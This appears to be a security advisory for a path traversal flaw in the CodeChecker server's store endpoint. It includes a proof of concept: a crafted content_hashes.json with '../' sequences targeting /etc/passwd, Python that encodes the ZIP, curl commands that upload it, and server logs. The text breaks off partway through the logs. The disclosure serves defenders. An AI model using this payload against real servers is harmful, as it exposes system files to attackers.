summary: "CodeChecker has a Path traversal in `CodeChecker server` in the endpoint of `CodeChecker\
  \ store`\n## Summary\n\nZIP files uploaded to the server-side endpoint handling a `CodeChecker\
  \ store` are not properly sanitized. An attacker can exercise a path traversal to make the\
  \ `CodeChecker server` load and display files from an arbitrary location on the server machine.\n\
  \n## Details\n\n### Target\n\nThe vulnerable endpoint is `/<PRODUCT_URL>/v6.53/CodeCheckerService@massStoreRun`.\n\
  \n### Exploit overview\n\nThe attack is made possible by improper sanitization at one point\
  \ in the process.\n\n1. When the ZIP file is uploaded by `CodeChecker store`, it is first\
  \ unzipped to a temporary directory (safely).\n2. When deciding which files to insert into\
  \ CodeChecker's internal database, the decision is made based on the `content_hashes.json`\
  \ in the ZIP. An attacker has control over the contents of this file.\n3. After reading that\
  \ file, the paths specified in the JSON are normalized by this code:\nhttps://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444\n\
  4. Providing sufficiently many `../../`s inside the `content_hashes.json`, an attacker can\
  \ control the insertion of completely arbitrary files into CodeChecker's internal database.\n\
  5. This is confirmed in the log output:\n```\nmass_store_run.py:444 __store_source_files()\
  \ - Storing source file: /etc/passwd\n```\n6. Once the file is inserted into the internal\
  \ database, it can be displayed trivially on the Web interface.\nAs CodeChecker doesn't distinguish\
  \ between filenames after the ZIP is extraced, an attacker can define aliases in `content_hashes.json`.\n\
  ```\nmass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\n\
  mass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.\n\
  ```\n7. The file is displayed in the Web UI if and only if there is at least one _bug report_\
  \ in it.\nThe bug reports are coming from the ZIP and the attacker can craft the required\
  \ contents for this.\nIf done so, the logs confirm the requirement for presenting the results\
  \ of the exploit will be triggered:\n```\nhash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2\n\
  ```\n8. The server emits the contents of the injected files from the server's database to\
  \ all users:\n![CodeChecker's Web UI showing the snapshot of the /etc/passwd file that was\
  \ injected to the database due to the path traversal attack.](https://user-images.githubusercontent.com/16914176/278057281-2c6994ed-4c24-4026-a6b6-148ac43243ca.png)\n\
  \n> [!NOTE]  \n> The file is shown with the contents as it was on the system when the exploited\
  \ `CodeChecker store` was exercised. This attack does not allow the server to return the \"\
  live\" contents of a file on the server's storage &mdash; the attacker(s) must recurringly\
  \ exercise the exploit to keep the injected files \"updated\" in the database.\n\n\n## PoC\n\
  \nThe minimal example that can trigger the exploit can be downloaded: [`PoC.zip`](https://github.com/Ericsson/codechecker/files/14757143/PoC.zip).\n\
  \nThe key to the exploit is the `content_hashes.json` file. The additional files create a\
  \ report in the loaded `/etc/passwd` file, so it is displayed in the web UI.\n\n<details><summary><tt>/content_hashes.json</tt></summary>\n\
  \n```json\n{\"/../../../../../../../../../../../../../../../etc/passwd\": \"malformed_hash\"\
  , \"/etc/passwd\": \"malformed_hash\"}\n```\n</details>\n\n#### Uploading the ZIP to the server\n\
  \nThe communication between the `CodeChecker store` and the server is done by transmitting\
  \ the ZIP file in a Base64-encoded string.  \nEncoding the ZIP into the format of the API\
  \ can be done with Python:\n\n```py\nimport base64\nimport zlib\n\nwith open(\"PoC.zip\",\
  \ \"rb\") as f:\n    contents = f.read()\nencoded = base64.b64encode(zlib.compress(contents))\n\
  print(encoded)\n```\n\nThe result of the compression and encoding can be sent to the running\
  \ server over the API.\nWhen the API is called, the exploit is exercised.\n\n```bash\ncurl\
  \ \"<SERVER_URL>/<PRODUCT_URL>/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\"\
  ,1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\":{\"str\":\"<ENCODED_ZIP>\"\
  },\"5\":{\"tf\":0}}]'\n```\n\n<details><summary>One-line PoC</summary>\n\n```bash\ncurl \"\
  http://localhost:8001/Default/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\"\
  ,1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\" {\"str\":\"\"\
  },\"5\":{\"tf\":0}}]' \n```\n</details>\n\n<details><summary>Full server logs for the <tt>store</tt>\
  \ processing</summary>\n\n```\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816>\
  \ - server.py:342 do_POST() - 127.0.0.1:33352 -- [Anonymous] POST /Default/v6.53/CodeCheckerService@massStoreRun\n\
  [INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:61 __enter__()\
  \ - [poc] Unzip storage file...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816>\
  \ - mass_store_run.py:82 unzip() - Unzipping mass storage ZIP '/tmp/tmpenegwbxj.zip' to '/home/discookie/.codechecker/tmpx7hg1teb'...\n\
  [INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:64 __exit__()\
  \ - [poc] Unzip storage file done... (duration: 0.0 sec)\n[DEBUG][2023-10-25 14:30:31] {server}\
  \ [2043] <139754026274816> - mass_store_run.py:1298 store() - Using unzipped folder '/home/discookie/.codechecker/tmpx7hg1teb'\n\
  [INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:61 __enter__()\
  \ - [poc] Store source files...\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816>\
  \ - mass_store_run.py:1310 store() - [poc] Storing 2 source file(s).\n[DEBUG][2023-10-25 14:30:31]\
  \ {server} [2043] <139754026274816> - mass_store_run.py:444 __store_source_files() - Storing\
  \ source file: /etc/passwd\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816>\
  \ - mass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\n\
  [DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:453 __store_source_files()\
  \ - /etc/passwd not found or already stored.\n[DEBUG][2023-10-25 14:30:31] {server} [2043]\
  \ <139754026274816> - mass_store_run.py:463 __store_source_files() - 17 fileid found\n[INFO][2023-10-25\
